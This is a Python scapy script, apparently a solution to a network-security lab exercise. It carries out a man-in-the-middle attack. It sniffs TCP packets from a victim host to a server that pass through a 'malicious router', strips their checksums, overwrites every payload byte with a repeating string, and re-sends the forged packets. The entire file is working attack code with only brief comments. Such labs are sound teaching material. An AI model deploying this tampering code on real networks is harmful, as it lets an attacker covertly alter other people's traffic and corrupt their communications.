#!/bin/env python3

from scapy.all import *

IP_VCT  = '10.9.0.5'
IP_DST  = '192.168.60.5'
# MAC_R   = '02:42:0a:09:00:0b'
# MAC_M   = '02:42:0a:09:00:6f'

# only capture packets between the victim to 192.168.60.5
# the dst MAC address has to be the malicious router 02:42:0a:09:00:6f
# otherwise, the modified packets will also be captured
F = 'tcp and src host 10.9.0.5 and dst host 192.168.60.5 and ether dst 02:42:0a:09:00:6f'

FNAME = ['h', 'e', 'i', 's', 'e', 'n', 'b', 'u', 'g']
LEN   = 9

def spoof_pkt(pkt):
    print("**** Got a packet ****\n")
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)
    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        list_str = list(data)
        cur = 0
        for i in range(0, len(list_str)):
            list_str[i] = FNAME[cur]
            cur = (cur + 1) % LEN
        list_str[-1] = '\n'
        newdata = ''.join(list_str)
        send(newpkt/newdata)
    else:
        send(newpkt)

pkt = sniff(iface='eth0', filter=F, prn=spoof_pkt)
